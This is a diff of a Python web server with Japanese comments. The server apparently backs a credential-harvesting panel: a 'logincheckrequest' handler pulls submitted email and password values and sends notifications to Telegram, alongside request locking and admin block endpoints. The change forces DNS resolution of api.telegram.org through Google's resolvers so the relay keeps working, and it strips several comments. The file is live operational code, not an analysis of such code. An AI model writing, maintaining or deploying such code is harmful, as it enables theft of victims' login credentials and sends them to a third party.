@@ -16,6 +16,32 @@ import uuid
 import threading
 import socket
 
+# Google DNSを使ってDNS解決を強制（api.telegram.org用）
+try:
+    import dns.resolver
+    
+    original_getaddrinfo = socket.getaddrinfo
+    
+    def custom_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
+        if host == 'api.telegram.org':
+            try:
+                resolver = dns.resolver.Resolver()
+                resolver.nameservers = ['8.8.8.8', '8.8.4.4']
+                resolver.timeout = 5
+                resolver.lifetime = 5
+                answers = resolver.resolve(host, 'A')
+                ip = str(answers[0])
+                print(f"[INFO] DNS解決成功: {host} -> {ip}")
+                return original_getaddrinfo(ip, port, family, type, proto, flags)
+            except Exception as e:
+                print(f"[WARN] カスタムDNS解決失敗: {e}, デフォルトにフォールバック")
+        return original_getaddrinfo(host, port, family, type, proto, flags)
+    
+    socket.getaddrinfo = custom_getaddrinfo
+    print("[INFO] Google DNSリゾルバ設定完了")
+except ImportError:
+    print("[WARN] dnspythonが未インストール、通常のDNS解決を使用")
+
 # DNS解決のタイムアウトを30秒に設定
 socket.setdefaulttimeout(30)
 
@@ -50,7 +76,6 @@ def send_telegram_notification(message):
                     'text': message,
                     'parse_mode': 'HTML'
                 }
-                # タイムアウトを30秒に延長
                 response = requests.post(url, json=payload, timeout=30)
                 if response.status_code == 200:
                     print(f"[INFO] Telegram通知送信成功: {chat_id}")
@@ -59,7 +84,6 @@ def send_telegram_notification(message):
             except Exception as e:
                 print(f"[ERROR] Telegram通知エラー: {chat_id} - {e}")
     
-    # 別スレッドで実行
     threading.Thread(target=_send, daemon=True).start()
 
 # ===========================
@@ -108,7 +132,6 @@ def create_request(genre, callback_url, data=None):
     
     print(f"[INFO] リクエスト作成: {genre} - {request_id}")
     
-    # 120秒後に自動削除するタイマーを開始
     threading.Timer(120.0, lambda: delete_request_after_timeout(genre, request_id)).start()
     
     return request_id
@@ -163,7 +186,6 @@ def update_request_status(genre, request_id, status, locked_by=None):
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     
-    # まず現在のレコードを確認
     cursor.execute('SELECT id, genre, status FROM requests WHERE genre = ? AND id = ?', (genre, request_id))
     existing = cursor.fetchone()
     print(f"[DEBUG] ★★★ 既存レコード: {existing}")
@@ -472,7 +494,6 @@ def create_request_endpoint():
         
         request_id = create_request(genre, callback_url, json.dumps(request_data) if request_data else None)
         
-        # logincheckrequestの場合、Telegram通知を送信
         if genre == 'logincheckrequest' and request_data:
             email = request_data.get('email', '不明')
             password = request_data.get('password', '不明')
@@ -812,7 +833,6 @@ def api_admin_block_delete():
 
 init_db()
 
-# Telegram API DNS解決をウォームアップ（起動時に非同期で実行）
 def warmup_telegram_dns():
     """起動時にTelegram APIのDNS解決をキャッシュ"""
     def _warmup():
